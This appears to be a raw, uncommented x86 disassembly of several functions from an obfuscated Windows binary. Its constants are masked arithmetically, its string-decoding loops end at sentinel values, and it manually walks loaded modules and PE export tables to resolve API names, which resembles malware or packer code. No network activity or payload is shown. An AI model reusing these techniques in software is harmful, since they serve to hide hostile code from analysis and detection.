  4223e0:	mov    eax,DWORD PTR [ebp+0x8]
  4223e3:	mov    WORD PTR [edx],cx
  4223e6:	add    edx,0x2
  4223e9:	movzx  edi,WORD PTR [eax+edx*1]
  4223ed:	mov    ecx,edi
  4223ef:	add    edi,0xffffc4a1
  4223f5:	xor    edi,esi
  4223f7:	mov    eax,0x4e3c
  4223fc:	cmp    di,ax
  4223ff:	jne    0x4223e0
  422401:	xor    eax,eax
  422403:	pop    edi
  422404:	mov    WORD PTR [edx],ax
  422407:	mov    eax,DWORD PTR [ebp-0x4]
  42240a:	pop    esi
  42240b:	leave  
  42240c:	ret    0x4
  42240f:	push   ebp
  422410:	mov    ebp,esp
  422412:	sub    esp,0x18
  422415:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  42241c:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  422423:	mov    ecx,DWORD PTR [ebp-0x8]
  422426:	push   esi
  422427:	mov    eax,0x75108b3
  42242c:	xor    ecx,eax
  42242e:	mov    esi,0x3272fa
  422433:	add    ecx,esi
  422435:	mov    DWORD PTR [ebp-0x4],ecx
  422438:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42243f:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  422446:	push   edi
  422447:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  42244e:	jmp    0x4224ef
  422453:	mov    ecx,DWORD PTR [ebp-0x4]
  422456:	mov    edx,DWORD PTR [ebp+0x10]
  422459:	sub    edx,ecx
  42245b:	mov    ecx,DWORD PTR [ebp-0xc]
  42245e:	xor    ecx,eax
  422460:	add    ecx,esi
  422462:	cmp    edx,ecx
  422464:	jbe    0x422481
  422466:	mov    edx,DWORD PTR [ebp-0x4]
  422469:	add    edx,DWORD PTR [ebp+0x8]
  42246c:	mov    ecx,DWORD PTR [ebp-0x4]
  42246f:	add    ecx,DWORD PTR [ebp+0xc]
  422472:	mov    edi,DWORD PTR [ecx]
  422474:	mov    DWORD PTR [edx],edi
  422476:	mov    ecx,DWORD PTR [ecx+0x4]
  422479:	mov    DWORD PTR [edx+0x4],ecx
  42247c:	mov    ecx,DWORD PTR [ebp-0xc]
  42247f:	jmp    0x4224ce
  422481:	mov    ecx,DWORD PTR [ebp-0x4]
  422484:	mov    edx,DWORD PTR [ebp+0x10]
  422487:	sub    edx,ecx
  422489:	mov    ecx,DWORD PTR [ebp-0x10]
  42248c:	xor    ecx,eax
  42248e:	add    ecx,esi
  422490:	cmp    edx,ecx
  422492:	mov    ecx,DWORD PTR [ebp-0x4]
  422495:	jbe    0x4224a9
  422497:	add    ecx,DWORD PTR [ebp+0x8]
  42249a:	mov    edx,DWORD PTR [ebp-0x4]
  42249d:	add    edx,DWORD PTR [ebp+0xc]
  4224a0:	mov    edx,DWORD PTR [edx]
  4224a2:	mov    DWORD PTR [ecx],edx
  4224a4:	mov    ecx,DWORD PTR [ebp-0x10]
  4224a7:	jmp    0x4224ce
  4224a9:	mov    edx,DWORD PTR [ebp+0x10]
  4224ac:	sub    edx,ecx
  4224ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4224b1:	xor    ecx,eax
  4224b3:	add    ecx,esi
  4224b5:	cmp    edx,ecx
  4224b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4224ba:	jbe    0x4224df
  4224bc:	add    ecx,DWORD PTR [ebp+0x8]
  4224bf:	mov    edx,DWORD PTR [ebp-0x4]
  4224c2:	add    edx,DWORD PTR [ebp+0xc]
  4224c5:	mov    dx,WORD PTR [edx]
  4224c8:	mov    WORD PTR [ecx],dx
  4224cb:	mov    ecx,DWORD PTR [ebp-0x14]
  4224ce:	mov    edx,DWORD PTR [ebp-0x4]
  4224d1:	xor    ecx,eax
  4224d3:	lea    ecx,[ecx+edx*1+0x3272fa]
  4224da:	mov    DWORD PTR [ebp-0x4],ecx
  4224dd:	jmp    0x4224ef
  4224df:	add    ecx,DWORD PTR [ebp+0x8]
  4224e2:	mov    edx,DWORD PTR [ebp-0x4]
  4224e5:	add    edx,DWORD PTR [ebp+0xc]
  4224e8:	mov    dl,BYTE PTR [edx]
  4224ea:	mov    BYTE PTR [ecx],dl
  4224ec:	inc    DWORD PTR [ebp-0x4]
  4224ef:	mov    ecx,DWORD PTR [ebp-0x18]
  4224f2:	mov    edx,DWORD PTR [ebp+0x10]
  4224f5:	xor    ecx,eax
  4224f7:	add    ecx,esi
  4224f9:	imul   ecx,edx
  4224fc:	mov    edx,DWORD PTR [ebp-0x8]
  4224ff:	mov    edi,DWORD PTR [ebp-0x4]
  422502:	xor    edx,eax
  422504:	lea    edx,[edx+edi*1+0x3272fa]
  42250b:	cmp    edx,ecx
  42250d:	jb     0x422453
  422513:	pop    edi
  422514:	pop    esi
  422515:	leave  
  422516:	ret    0xc
  422519:	push   ebp
  42251a:	mov    ebp,esp
  42251c:	sub    esp,0xc
  42251f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  422526:	push   esi
  422527:	mov    esi,eax
  422529:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  422530:	mov    edx,DWORD PTR [ebp-0x4]
  422533:	mov    eax,0x75108b3
  422538:	xor    edx,eax
  42253a:	mov    ecx,0x3272fa
  42253f:	add    edx,ecx
  422541:	cmp    esi,edx
  422543:	je     0x422585
  422545:	push   ebx
  422546:	push   edi
  422547:	mov    edx,DWORD PTR [ebp-0x8]
  42254a:	mov    ebx,DWORD PTR [ebp+0x8]
  42254d:	xor    edx,eax
  42254f:	mov    edi,0xffcd8d06
  422554:	sub    edi,edx
  422556:	add    esi,edi
  422558:	lea    edx,[esi-0x3272fa]
  42255e:	xor    edx,eax
  422560:	mov    DWORD PTR [ebp-0xc],edx
  422563:	mov    edx,DWORD PTR [ebp-0x4]
  422566:	mov    edi,DWORD PTR [ebp-0xc]
  422569:	xor    dl,0xb3
  42256c:	sub    dl,0x6
  42256f:	xor    edi,eax
  422571:	mov    BYTE PTR [edi+ebx*1+0x3272fa],dl
  422578:	mov    edx,DWORD PTR [ebp-0x4]
  42257b:	xor    edx,eax
  42257d:	add    edx,ecx
  42257f:	cmp    esi,edx
  422581:	jne    0x422547
  422583:	pop    edi
  422584:	pop    ebx
  422585:	pop    esi
  422586:	leave  
  422587:	ret    0x4
  42258a:	push   ebp
  42258b:	mov    ebp,esp
  42258d:	sub    esp,0x21c
  422593:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42259a:	mov    DWORD PTR [ebp-0x14],0xf89c85b4
  4225a1:	mov    eax,DWORD PTR [ebp+0x10]
  4225a4:	mov    eax,DWORD PTR [ebp-0x4]
  4225a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4225aa:	push   esi
  4225ab:	push   edi
  4225ac:	mov    edi,0x75108b3
  4225b1:	xor    eax,edi
  4225b3:	mov    esi,0x3272fa
  4225b8:	add    eax,esi
  4225ba:	cmp    eax,ecx
  4225bc:	mov    eax,DWORD PTR [ebp-0x4]
  4225bf:	jne    0x4225ca
  4225c1:	xor    eax,edi
  4225c3:	add    eax,esi
  4225c5:	jmp    0x422676
  4225ca:	mov    ecx,DWORD PTR [ebp+0xc]
  4225cd:	xor    eax,edi
  4225cf:	add    eax,esi
  4225d1:	cmp    eax,ecx
  4225d3:	jne    0x4225da
  4225d5:	mov    eax,DWORD PTR [ebp-0x4]
  4225d8:	jmp    0x4225c1
  4225da:	lea    eax,[ebp-0x21c]
  4225e0:	mov    DWORD PTR [ebp-0x8],eax
  4225e3:	mov    eax,DWORD PTR [ebp+0xc]
  4225e6:	mov    DWORD PTR [ebp-0x10],eax
  4225e9:	mov    eax,DWORD PTR [ebp-0x4]
  4225ec:	xor    eax,edi
  4225ee:	add    eax,esi
  4225f0:	mov    DWORD PTR [ebp+0x10],eax
  4225f3:	mov    eax,DWORD PTR [ebp+0xc]
  4225f6:	push   ebx
  4225f7:	call   0x422321
  4225fc:	mov    ebx,eax
  4225fe:	mov    eax,DWORD PTR [ebp+0x8]
  422601:	mov    eax,DWORD PTR [eax+0x14]
  422604:	jmp    0x42265e
  422606:	mov    eax,DWORD PTR [ebp+0xc]
  422609:	sub    eax,0x8
  42260c:	mov    DWORD PTR [ebp-0xc],eax
  42260f:	mov    eax,DWORD PTR [ebp-0xc]
  422612:	mov    eax,DWORD PTR [eax+0x28]
  422615:	call   0x422209
  42261a:	mov    DWORD PTR [ebp+0x10],eax
  42261d:	push   DWORD PTR [ebp+0x10]
  422620:	mov    edx,DWORD PTR [ebp-0x8]
  422623:	call   0x4223b0
  422628:	mov    eax,DWORD PTR [ebp-0x4]
  42262b:	xor    eax,edi
  42262d:	add    eax,esi
  42262f:	cmp    eax,ebx
  422631:	jne    0x42263b
  422633:	mov    eax,DWORD PTR [ebp-0x8]
  422636:	call   0x422297
  42263b:	mov    eax,DWORD PTR [ebp-0x14]
  42263e:	xor    eax,edi
  422640:	add    eax,esi
  422642:	push   eax
  422643:	push   DWORD PTR [ebp-0x10]
  422646:	mov    eax,DWORD PTR [ebp-0x8]
  422649:	call   0x421fc3
  42264e:	mov    ecx,DWORD PTR [ebp-0x4]
  422651:	xor    ecx,edi
  422653:	add    ecx,esi
  422655:	cmp    eax,ecx
  422657:	je     0x42267c
  422659:	mov    eax,DWORD PTR [ebp+0xc]
  42265c:	mov    eax,DWORD PTR [eax]
  42265e:	mov    DWORD PTR [ebp+0xc],eax
  422661:	mov    eax,DWORD PTR [ebp+0x8]
  422664:	mov    ecx,DWORD PTR [ebp+0xc]
  422667:	add    eax,0x14
  42266a:	cmp    ecx,eax
  42266c:	jne    0x422606
  42266e:	mov    eax,DWORD PTR [ebp-0x4]
  422671:	xor    eax,edi
  422673:	add    eax,esi
  422675:	pop    ebx
  422676:	pop    edi
  422677:	pop    esi
  422678:	leave  
  422679:	ret    0xc
  42267c:	mov    eax,DWORD PTR [ebp-0xc]
  42267f:	mov    eax,DWORD PTR [eax+0x18]
  422682:	jmp    0x422675
  422684:	push   ebp
  422685:	mov    ebp,esp
  422687:	mov    eax,DWORD PTR [ebp+0xc]
  42268a:	sub    esp,0x10
  42268d:	cmp    DWORD PTR [ebp+0x8],0x0
  422691:	push   ebx
  422692:	push   esi
  422693:	push   edi
  422694:	je     0x422749
  42269a:	test   eax,eax
  42269c:	je     0x422749
  4226a2:	movzx  eax,WORD PTR [eax+0x20]
  4226a6:	mov    ecx,eax
  4226a8:	mov    DWORD PTR [ebp-0x10],eax
  4226ab:	xor    edx,edx
  4226ad:	and    DWORD PTR [ebp-0x8],edx
  4226b0:	mov    eax,0x8a9d
  4226b5:	xor    ecx,eax
  4226b7:	add    ecx,0x3b5f
  4226bd:	mov    DWORD PTR [ebp-0xc],ecx
  4226c0:	and    DWORD PTR [ebp-0x4],0x0
  4226c4:	xor    ecx,ecx
  4226c6:	push   0x7d
  4226c8:	pop    edi
  4226c9:	cmp    cx,WORD PTR [ebp-0xc]
  4226cd:	jae    0x422733
  4226cf:	lea    esi,[edx-0x3b5f]
  4226d5:	xor    esi,eax
  4226d7:	movzx  ecx,WORD PTR [ebp-0x4]
  4226db:	mov    ebx,DWORD PTR [ebp+0xc]
  4226de:	lea    ecx,[ebx+ecx*4]
  4226e1:	cmp    WORD PTR [ecx+0x2],si
  4226e5:	jne    0x42271e
  4226e7:	movzx  ecx,WORD PTR [ecx]
  4226ea:	mov    edi,0x4e3c
  4226ef:	cmp    cx,di
  4226f2:	jne    0x422700
  4226f4:	mov    ebx,DWORD PTR [ebp+0x8]
  4226f7:	movzx  edi,dx
  4226fa:	cmp    BYTE PTR [edi+ebx*1],0x0
  4226fe:	je     0x42272d
  422700:	mov    ebx,DWORD PTR [ebp+0x8]
  422703:	movzx  edi,dx
  422706:	movsx  di,BYTE PTR [edi+ebx*1]
  42270b:	mov    ebx,0x3b5f
  422710:	sub    di,bx
  422713:	xor    di,ax
  422716:	cmp    cx,di
  422719:	je     0x42272d
  42271b:	push   0x7b
  42271d:	pop    edi
  42271e:	inc    DWORD PTR [ebp-0x4]
  422721:	mov    cx,WORD PTR [ebp-0xc]
  422725:	cmp    WORD PTR [ebp-0x4],cx
  422729:	jb     0x4226d7
  42272b:	jmp    0x422733
  42272d:	inc    DWORD PTR [ebp-0x8]
  422730:	push   0x7a
  422732:	pop    edi
  422733:	mov    esi,DWORD PTR [ebp+0x8]
  422736:	movzx  ecx,dx
  422739:	cmp    BYTE PTR [ecx+esi*1],0x0
  42273d:	je     0x422752
  42273f:	inc    edx
  422740:	cmp    edi,0x7b
  422743:	jne    0x4226c0
  422749:	xor    eax,eax
  42274b:	pop    edi
  42274c:	pop    esi
  42274d:	pop    ebx
  42274e:	leave  
  42274f:	ret    0x8
  422752:	mov    ecx,DWORD PTR [ebp-0x8]
  422755:	add    ecx,0xffffc4a1
  42275b:	xor    cx,ax
  42275e:	xor    eax,eax
  422760:	cmp    cx,WORD PTR [ebp-0x10]
  422764:	sete   al
  422767:	jmp    0x42274b
  422769:	push   ebp
  42276a:	mov    ebp,esp
  42276c:	sub    esp,0x50
  42276f:	push   edi
  422770:	mov    edi,eax
  422772:	mov    eax,DWORD PTR [edi+0x1a8]
  422778:	cmp    DWORD PTR [eax],0x0
  42277b:	jne    0x422784
  42277d:	xor    eax,eax
  42277f:	jmp    0x4228b5
  422784:	push   DWORD PTR [ebp+0x8]
  422787:	push   0x2c
  422789:	pop    eax
  42278a:	call   0x422519
  42278f:	mov    edx,DWORD PTR [edi+0x1ac]
  422795:	lea    eax,[edi+0x22]
  422798:	mov    DWORD PTR [ebp-0x4c],eax
  42279b:	lea    eax,[edi+0x44]
  42279e:	mov    DWORD PTR [ebp-0x48],eax
  4227a1:	lea    eax,[edi+0x66]
  4227a4:	mov    DWORD PTR [ebp-0x44],eax
  4227a7:	lea    eax,[edi+0x88]
  4227ad:	mov    DWORD PTR [ebp-0x40],eax
  4227b0:	lea    eax,[edi+0xaa]
  4227b6:	mov    DWORD PTR [ebp-0x3c],eax
  4227b9:	lea    eax,[edi+0xcc]
  4227bf:	mov    DWORD PTR [ebp-0x38],eax
  4227c2:	lea    eax,[edi+0xee]
  4227c8:	mov    DWORD PTR [ebp-0x34],eax
  4227cb:	lea    eax,[edi+0x110]
  4227d1:	mov    DWORD PTR [ebp-0x30],eax
  4227d4:	lea    eax,[edi+0x132]
  4227da:	mov    DWORD PTR [ebp-0x2c],eax
  4227dd:	lea    eax,[edi+0x154]
  4227e3:	push   edi
  4227e4:	mov    DWORD PTR [ebp-0x50],edi
  4227e7:	mov    DWORD PTR [ebp-0x28],eax
  4227ea:	call   0x4228e9
  4227ef:	push   eax
  4227f0:	mov    eax,DWORD PTR [edi+0x1a8]
  4227f6:	push   DWORD PTR [eax]
  4227f8:	call   0x42258a
  4227fd:	mov    DWORD PTR [ebp-0x10],eax
  422800:	test   eax,eax
  422802:	je     0x4228b5
  422808:	mov    ecx,DWORD PTR [eax+0x3c]
  42280b:	push   ebx
  42280c:	push   esi
  42280d:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  422811:	add    esi,eax
  422813:	mov    edi,DWORD PTR [esi+0x24]
  422816:	mov    ecx,DWORD PTR [esi+0x1c]
  422819:	mov    edx,DWORD PTR [esi+0x20]
  42281c:	mov    ebx,DWORD PTR [esi+0x18]
  42281f:	add    edi,eax
  422821:	mov    DWORD PTR [ebp-0x20],edi
  422824:	mov    edi,DWORD PTR [esi+0x14]
  422827:	add    ecx,eax
  422829:	add    edx,eax
  42282b:	mov    DWORD PTR [ebp-0xc],ecx
  42282e:	mov    DWORD PTR [ebp-0x1c],edx
  422831:	mov    DWORD PTR [ebp-0x8],edi
  422834:	cmp    edi,ebx
  422836:	ja     0x42283b
  422838:	mov    DWORD PTR [ebp-0x8],ebx
  42283b:	xor    ebx,ebx
  42283d:	mov    DWORD PTR [ebp-0x18],ebx
  422840:	cmp    DWORD PTR [ebp-0x8],ebx
  422843:	jbe    0x4228b3
  422845:	jmp    0x42284a
  422847:	mov    edx,DWORD PTR [ebp-0x1c]
  42284a:	mov    edi,DWORD PTR [ebp-0x20]
  42284d:	movzx  edi,WORD PTR [edi+ebx*2]
  422851:	cmp    ebx,DWORD PTR [esi+0x18]
  422854:	jae    0x4228b3
  422856:	cmp    edi,DWORD PTR [esi+0x14]
  422859:	jae    0x4228b3
  42285b:	mov    ebx,DWORD PTR [edx+ebx*4]
  42285e:	mov    edx,DWORD PTR [ebp+0x8]
  422861:	mov    edi,DWORD PTR [ecx+edi*4]
  422864:	mov    DWORD PTR [ebp-0x4],edx
  422867:	lea    edx,[ebp-0x50]
  42286a:	add    ebx,eax
  42286c:	add    edi,eax
  42286e:	sub    edx,DWORD PTR [ebp+0x8]
  422871:	mov    DWORD PTR [ebp-0x14],0xb
  422878:	mov    DWORD PTR [ebp-0x24],edx
  42287b:	mov    edx,DWORD PTR [ebp-0x4]
  42287e:	cmp    DWORD PTR [edx],0x0
  422881:	jne    0x42289e
  422883:	mov    eax,DWORD PTR [ebp-0x24]
  422886:	push   DWORD PTR [eax+edx*1]
  422889:	push   ebx
  42288a:	call   0x422684
  42288f:	mov    ecx,DWORD PTR [ebp-0xc]
  422892:	test   eax,eax
  422894:	je     0x42289b
  422896:	mov    eax,DWORD PTR [ebp-0x4]
  422899:	mov    DWORD PTR [eax],edi
  42289b:	mov    eax,DWORD PTR [ebp-0x10]
  42289e:	add    DWORD PTR [ebp-0x4],0x4
  4228a2:	dec    DWORD PTR [ebp-0x14]
  4228a5:	jne    0x42287b
  4228a7:	mov    ebx,DWORD PTR [ebp-0x18]
  4228aa:	inc    ebx
  4228ab:	mov    DWORD PTR [ebp-0x18],ebx
  4228ae:	cmp    ebx,DWORD PTR [ebp-0x8]
  4228b1:	jb     0x422847
  4228b3:	pop    esi
  4228b4:	pop    ebx
  4228b5:	pop    edi
  4228b6:	leave  
  4228b7:	ret    0x4
  4228ba:	push   ebp
  4228bb:	mov    ebp,esp
  4228bd:	mov    eax,DWORD PTR [ebp+0x8]
  4228c0:	push   esi
  4228c1:	push   DWORD PTR [eax+0x1e0]
  4228c7:	lea    esi,[eax+0x198]
  4228cd:	mov    eax,DWORD PTR [ebp+0x8]
  4228d0:	call   0x422769
  4228d5:	mov    ecx,DWORD PTR [esi]
  4228d7:	mov    DWORD PTR [ecx],eax
  4228d9:	mov    eax,DWORD PTR [esi]
  4228db:	xor    ecx,ecx
  4228dd:	cmp    DWORD PTR [eax],ecx
  4228df:	pop    esi
  4228e0:	setne  cl
  4228e3:	mov    eax,ecx
  4228e5:	pop    ebp
  4228e6:	ret    0x4
  4228e9:	mov    ecx,DWORD PTR [edi+0x188]
  4228ef:	push   ebx
  4228f0:	jmp    0x422905
  4228f2:	xor    eax,0x8a9d
  4228f7:	add    eax,0x3b5f
  4228fc:	mov    WORD PTR [ecx],ax
  4228ff:	add    ecx,0x2
  422902:	add    edx,0x2
  422905:	movzx  eax,WORD PTR [edx]
  422908:	mov    ebx,0x4e3c
  42290d:	cmp    ax,bx
  422910:	jne    0x4228f2
  422912:	xor    eax,eax
  422914:	mov    WORD PTR [ecx],ax
  422917:	mov    eax,DWORD PTR [edi+0x188]
  42291d:	pop    ebx
  42291e:	ret    
  42291f:	push   edi
  422920:	mov    edi,eax
  422922:	mov    eax,DWORD PTR [esi+0x188]
  422928:	shl    edi,0x6
  42292b:	add    eax,edi
  42292d:	jmp    0x422939
  42292f:	xor    cl,0x81
  422932:	add    cl,0x6
  422935:	mov    BYTE PTR [eax],cl
  422937:	inc    eax
  422938:	inc    edx
  422939:	mov    cl,BYTE PTR [edx]
  42293b:	cmp    cl,0x7b
  42293e:	jne    0x42292f
  422940:	mov    BYTE PTR [eax],0x0
  422943:	mov    eax,DWORD PTR [esi+0x188]
  422949:	add    eax,edi
  42294b:	pop    edi
  42294c:	ret    
  42294d:	push   ebp
  42294e:	mov    ebp,esp
  422950:	sub    esp,0x14
  422953:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42295a:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  422961:	mov    eax,DWORD PTR [ebx]
  422963:	mov    DWORD PTR [ebp-0x8],eax
  422966:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42296d:	push   esi
  42296e:	push   edi
  42296f:	mov    DWORD PTR [ebp-0x14],0xead71895
  422976:	mov    edi,DWORD PTR [ebp-0x4]
  422979:	mov    ecx,DWORD PTR [ebp-0x10]
  42297c:	mov    eax,0x75108b3
  422981:	xor    edi,eax
  422983:	mov    edx,0x3272fa
  422988:	xor    ecx,eax
  42298a:	add    edi,edx
  42298c:	add    ecx,edx
  42298e:	imul   edi,ecx
  422991:	jmp    0x4229d9
  422993:	mov    ecx,DWORD PTR [ebp-0x8]
  422996:	mov    esi,DWORD PTR [ebp-0x4]
  422999:	xor    ecx,eax
  42299b:	xor    esi,eax
  42299d:	add    ecx,edx
  42299f:	add    esi,edx
  4229a1:	test   esi,ecx
  4229a3:	mov    esi,DWORD PTR [ebp-0x8]
  4229a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4229a9:	je     0x4229c0
  4229ab:	xor    ecx,eax
  4229ad:	xor    esi,eax
  4229af:	add    ecx,edx
  4229b1:	add    esi,edx
  4229b3:	shr    esi,cl
  4229b5:	mov    ecx,DWORD PTR [ebp-0x14]
  4229b8:	xor    ecx,eax
  4229ba:	add    ecx,edx
  4229bc:	xor    esi,ecx
  4229be:	jmp    0x4229ca
  4229c0:	xor    esi,eax
  4229c2:	xor    ecx,eax
  4229c4:	add    esi,edx
  4229c6:	add    ecx,edx
  4229c8:	shr    esi,cl
  4229ca:	mov    DWORD PTR [ebp-0x8],esi
  4229cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4229d0:	xor    ecx,eax
  4229d2:	lea    edi,[edi+ecx*1+0x3272fa]
  4229d9:	mov    ecx,DWORD PTR [ebp-0xc]
  4229dc:	mov    esi,DWORD PTR [ebp-0x4]
  4229df:	xor    esi,eax
  4229e1:	xor    ecx,eax
  4229e3:	sub    ecx,esi
  4229e5:	cmp    edi,ecx
  4229e7:	jbe    0x422993
  4229e9:	mov    eax,DWORD PTR [ebp-0x8]
  4229ec:	pop    edi
  4229ed:	mov    DWORD PTR [ebx],eax
  4229ef:	mov    eax,DWORD PTR [ebp-0x8]
  4229f2:	pop    esi
  4229f3:	leave  
  4229f4:	ret    
  4229f5:	push   ebp
  4229f6:	mov    ebp,esp
  4229f8:	sub    esp,0x38
  4229fb:	push   ebx
  4229fc:	mov    ebx,0xf89c85b5
  422a01:	mov    DWORD PTR [ebp-0x4],ebx
  422a04:	lea    ecx,[ebx-0x1]
  422a07:	mov    DWORD PTR [ebp-0x24],ecx
  422a0a:	mov    eax,DWORD PTR [ebp-0x4]
  422a0d:	mov    edx,DWORD PTR [ebp+0x8]
  422a10:	push   esi
  422a11:	mov    esi,0x75108b3
  422a16:	xor    eax,esi
  422a18:	push   edi
  422a19:	mov    edi,0x3272fa
  422a1e:	add    eax,edi
  422a20:	cmp    edx,eax
  422a22:	mov    eax,DWORD PTR [ebp-0x4]
  422a25:	je     0x422b8a
  422a2b:	mov    edx,DWORD PTR [ebp+0xc]
  422a2e:	xor    eax,esi
  422a30:	add    eax,edi
  422a32:	cmp    edx,eax
  422a34:	je     0x422b87
  422a3a:	mov    eax,DWORD PTR [ebp+0x10]
  422a3d:	mov    edx,DWORD PTR [ebp+0xc]
  422a40:	mov    DWORD PTR [ebp-0x14],eax
  422a43:	mov    eax,DWORD PTR [ebp+0x8]
  422a46:	mov    DWORD PTR [ebp-0x18],0xf89c8522
  422a4d:	mov    DWORD PTR [ebp-0xc],eax
  422a50:	lea    eax,[ebx+0x6]
  422a53:	mov    DWORD PTR [ebp-0x1c],eax
  422a56:	mov    DWORD PTR [ebp-0x10],ebx
  422a59:	mov    DWORD PTR [ebp+0xc],ecx
  422a5c:	mov    DWORD PTR [ebp+0x10],eax
  422a5f:	mov    eax,DWORD PTR [ebp+0xc]
  422a62:	xor    eax,esi
  422a64:	mov    DWORD PTR [ebp-0x20],edx
  422a67:	sub    edx,eax
  422a69:	sub    edx,edi
  422a6b:	mov    DWORD PTR [ebp+0x8],edx
  422a6e:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  422a75:	jmp    0x422b77
  422a7a:	mov    eax,DWORD PTR [ebp+0xc]
  422a7d:	mov    ecx,DWORD PTR [ebp+0xc]
  422a80:	xor    eax,esi
  422a82:	xor    ecx,esi
  422a84:	lea    ecx,[eax+ecx*1+0x64e5f4]
  422a8b:	mov    eax,DWORD PTR [ebp+0x8]
  422a8e:	xor    edx,edx
  422a90:	div    ecx
  422a92:	mov    eax,DWORD PTR [ebp+0x10]
  422a95:	mov    ecx,DWORD PTR [ebp+0xc]
  422a98:	xor    eax,esi
  422a9a:	xor    ecx,esi
  422a9c:	sub    eax,ecx
  422a9e:	cmp    edx,eax
  422aa0:	jne    0x422b36
  422aa6:	mov    eax,DWORD PTR [ebp+0x8]
  422aa9:	mov    ecx,DWORD PTR [ebp-0xc]
  422aac:	mov    dl,BYTE PTR [eax+ecx*1]
  422aaf:	mov    eax,DWORD PTR [ebp-0x10]
  422ab2:	mov    ecx,DWORD PTR [ebp-0x8]
  422ab5:	xor    eax,esi
  422ab7:	xor    ecx,esi
  422ab9:	add    eax,edi
  422abb:	add    ecx,edi
  422abd:	cmp    eax,ecx
  422abf:	jae    0x422b07
  422ac1:	lea    ecx,[eax-0x3272fa]
  422ac7:	mov    DWORD PTR [ebp-0x4],ecx
  422aca:	mov    ebx,DWORD PTR [ebp-0x4]
  422acd:	xor    ebx,esi
  422acf:	add    ebx,0x7f55d8fb
  422ad5:	lea    ecx,[ebp+eax*4-0x38]
  422ad9:	mov    DWORD PTR [ecx],ebx
  422adb:	mov    ebx,DWORD PTR [ecx]
  422add:	cmp    ebx,0x244ecb9a
  422ae3:	jbe    0x422aed
  422ae5:	add    DWORD PTR [ecx],0x405fcd9
  422aeb:	jmp    0x422af3
  422aed:	add    DWORD PTR [ecx],0xfdaf4327
  422af3:	mov    ecx,DWORD PTR [ebp-0x8]
  422af6:	xor    ecx,esi
  422af8:	inc    eax
  422af9:	inc    DWORD PTR [ebp-0x4]
  422afc:	add    ecx,edi
  422afe:	cmp    eax,ecx
  422b00:	jb     0x422aca
  422b02:	mov    ebx,0xf89c85b5
  422b07:	cmp    DWORD PTR [ebp-0x14],0x0
  422b0b:	jne    0x422b15
  422b0d:	xor    dl,0x81
  422b10:	add    dl,0x6
  422b13:	jmp    0x422b2b
  422b15:	mov    eax,DWORD PTR [ebp-0x18]
  422b18:	xor    al,0xb3
  422b1a:	mov    cl,0x6
  422b1c:	sub    cl,al
  422b1e:	add    dl,cl
  422b20:	mov    ecx,DWORD PTR [ebp-0x1c]
  422b23:	xor    cl,0xb3
  422b26:	sub    cl,0x6
  422b29:	ror    dl,cl
  422b2b:	xor    eax,eax
  422b2d:	mov    eax,DWORD PTR [ebp+0x8]
  422b30:	mov    ecx,DWORD PTR [ebp-0xc]
  422b33:	mov    BYTE PTR [eax+ecx*1],dl
  422b36:	mov    eax,DWORD PTR [ebp+0x8]
  422b39:	mov    ecx,DWORD PTR [ebp-0x10]
  422b3c:	sub    eax,edi
  422b3e:	xor    eax,esi
  422b40:	cmp    eax,ecx
  422b42:	jne    0x422b65
  422b44:	mov    eax,DWORD PTR [ebp+0x10]
  422b47:	mov    ecx,DWORD PTR [ebp+0xc]
  422b4a:	xor    eax,esi
  422b4c:	xor    ecx,esi
  422b4e:	sub    eax,ecx
  422b50:	mov    ecx,DWORD PTR [ebp-0x20]
  422b53:	sub    eax,edi
  422b55:	xor    eax,esi
  422b57:	mov    DWORD PTR [ebp+0x10],eax
  422b5a:	mov    eax,DWORD PTR [ebp+0xc]
  422b5d:	xor    eax,esi
  422b5f:	sub    ecx,eax
  422b61:	sub    ecx,edi
  422b63:	jmp    0x422b74
  422b65:	mov    eax,DWORD PTR [ebp+0xc]
  422b68:	xor    eax,esi
  422b6a:	mov    ecx,0xffcd8d06
  422b6f:	sub    ecx,eax
  422b71:	add    ecx,DWORD PTR [ebp+0x8]
  422b74:	mov    DWORD PTR [ebp+0x8],ecx
  422b77:	mov    eax,DWORD PTR [ebp+0x10]
  422b7a:	cmp    eax,ebx
  422b7c:	jne    0x422a7a
  422b82:	mov    eax,DWORD PTR [ebp-0x24]
  422b85:	jmp    0x422b8a
  422b87:	mov    eax,DWORD PTR [ebp-0x4]
  422b8a:	xor    eax,esi
  422b8c:	add    eax,edi
  422b8e:	pop    edi
  422b8f:	pop    esi
  422b90:	pop    ebx
  422b91:	leave  
  422b92:	ret    0xc
  422b95:	push   ebp
  422b96:	mov    ebp,esp
  422b98:	sub    esp,0x420
  422b9e:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  422ba5:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  422bac:	mov    DWORD PTR [ebp-0x18],0xf89c86b5
  422bb3:	push   ebx
  422bb4:	mov    DWORD PTR [ebp-0x1c],0xf89c85b6
  422bbb:	mov    eax,DWORD PTR [ebp-0x14]
  422bbe:	push   esi
  422bbf:	mov    esi,0x75108b3
  422bc4:	push   edi
  422bc5:	xor    eax,esi
  422bc7:	mov    edi,0x3272fa
  422bcc:	add    eax,edi
  422bce:	mov    DWORD PTR [ebp-0x8],eax
  422bd1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  422bd8:	mov    DWORD PTR [ebp-0x4],0xead71895
  422bdf:	mov    DWORD PTR [ebp-0x10],0x8
  422be6:	mov    ecx,ecx
  422be8:	mov    eax,DWORD PTR [ebp-0xc]
  422beb:	mov    ecx,DWORD PTR [ebp-0x14]
  422bee:	xor    eax,esi
  422bf0:	xor    ecx,esi
  422bf2:	add    eax,edi
  422bf4:	add    ecx,edi
